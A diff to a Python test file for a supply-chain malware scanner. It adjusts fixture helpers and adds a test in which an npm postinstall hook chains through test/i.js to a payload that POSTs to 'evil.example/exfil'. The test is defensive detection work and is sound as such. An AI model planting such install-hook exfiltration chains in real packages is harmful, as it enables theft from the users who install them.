@@ -1,15 +1,10 @@
 """Reconstructed supply-chain-incident fixtures, run end to end.
 
 Each test builds two on-disk trees shaped exactly like what `fetch_source()`
-returns for a real fetch (a wrapper directory — npm's `package/`, GitHub's
-`{repo}-{ref}/` — plus a sibling `.complete` marker), runs the *real* Semgrep
-scanner against both, then feeds the resulting profiles through
-`compute_delta` and `compare_sources`. These are the payloads the review
-flagged as missing: the three real bugs it found (drift never collapsing the
-wrapper, install-hook lookup missing the wrapper, and the sourcemap `lstrip`
-bug) are exactly what fixtures shaped this way would have caught, since the
-earlier versions built their test directories without the `.complete`
-marker.
+returns for a real fetch since PR #91 — a plain directory of files (no wrapper
+level; both npm and GitHub sources are extracted unwrapped) plus a sibling
+`.complete` marker — runs the *real* Semgrep scanner against both, then feeds
+the resulting profiles through `compute_delta` and `compare_sources`.
 
 The payloads below are inert reconstructions of publicly documented
 incidents (event-stream, ua-parser-js, node-ipc, colors.js) — labelled data
@@ -33,13 +28,16 @@ pytestmark = pytest.mark.skipif(
 )
 
 
-def _fetched(tmp_path: Path, label: str, wrapper: str) -> tuple[Path, Path]:
-    """A fetch_source()-shaped directory: wrapper/ + a sibling .complete marker."""
+def _fetched(tmp_path: Path, label: str, _unused_wrapper: str | None = None) -> tuple[Path, Path]:
+    """A fetch_source()-shaped directory (post-#91): files directly inside,
+    plus a sibling .complete marker. Returned twice (dir, dir) so call sites
+    written against the old (fetch_dir, content_dir) pair need no changes.
+    `_unused_wrapper` keeps the old 3-arg call sites working unchanged — real
+    fetches have no wrapper level to name any more."""
     fetch_dir = tmp_path / label
-    content_dir = fetch_dir / wrapper
-    content_dir.mkdir(parents=True)
-    (fetch_dir / ".complete").touch()
-    return fetch_dir, content_dir
+    fetch_dir.mkdir(parents=True)
+    (tmp_path / f"{label}.complete").touch()
+    return fetch_dir, fetch_dir
 
 
 def _write(content_dir: Path, rel_path: str, text: str) -> None:
@@ -311,6 +309,48 @@ async def test_install_hook_target_under_test_dir_is_forced_shipped(tmp_path):
     assert all(e.path_class == PathClass.SHIPPED for e in hook_evidence)
     assert all(e.install_time for e in hook_evidence)
     assert all(e.reclassified_from == PathClass.TEST for e in hook_evidence)
+
+
+@pytest.mark.asyncio
+async def test_install_hook_target_requiring_a_test_payload_is_forced_shipped(tmp_path):
+    """The chain the Week 2 review flagged as a confirmed bypass: a postinstall
+    hook runs `test/i.js`, which itself `require()`'s `./payload` — a second
+    file under test/ that the hook never names directly. Without seeding
+    reachability from install-time files (not just the hook target's own
+    evidence), the payload's network/process capability stays hidden behind
+    `path_class=TEST` and `category_set()` reports only `build_install`."""
+    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
+    _write(
+        curr_content,
+        "package.json",
+        json.dumps(
+            {
+                "name": "chain-hook-pkg",
+                "version": "1.0.0",
+                "scripts": {"postinstall": "node test/i.js"},
+            }
+        ),
+    )
+    _write(curr_content, "index.js", "module.exports = {};")
+    _write(curr_content, "test/i.js", "require('./payload');\n")
+    _write(
+        curr_content,
+        "test/payload.js",
+        "fetch('https://evil.example/exfil', {method: 'POST'});\nmodule.exports = {};\n",
+    )
+
+    profile = await _scan(curr_dir, "chain-hook-pkg", "1.0.0")
+
+    from backend.models.enums import CapabilityCategory, PathClass
+
+    assert CapabilityCategory.NETWORK in profile.category_set()
+    payload_evidence = [
+        e for e in profile.evidence if e.file.replace("\\", "/").endswith("test/payload.js")
+    ]
+    assert payload_evidence, "expected evidence from test/payload.js"
+    assert all(e.path_class == PathClass.SHIPPED for e in payload_evidence)
+    assert all(e.reclassified_from == PathClass.TEST for e in payload_evidence)
+    assert all(e.install_time for e in payload_evidence)
 
 
 @pytest.mark.asyncio
